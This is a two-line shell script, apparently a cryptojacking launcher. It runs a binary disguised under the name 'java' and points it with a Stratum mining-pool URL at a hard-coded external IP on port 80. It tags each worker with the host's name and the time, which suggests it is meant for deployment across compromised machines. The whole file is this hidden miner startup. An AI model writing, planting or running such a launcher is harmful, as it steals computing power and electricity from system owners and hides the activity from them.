#!/bin/sh

./java -P stratum1+tcp://lovelyn.$HOSTNAME-$(date +%H-%M):123456@20.205.19.146:80
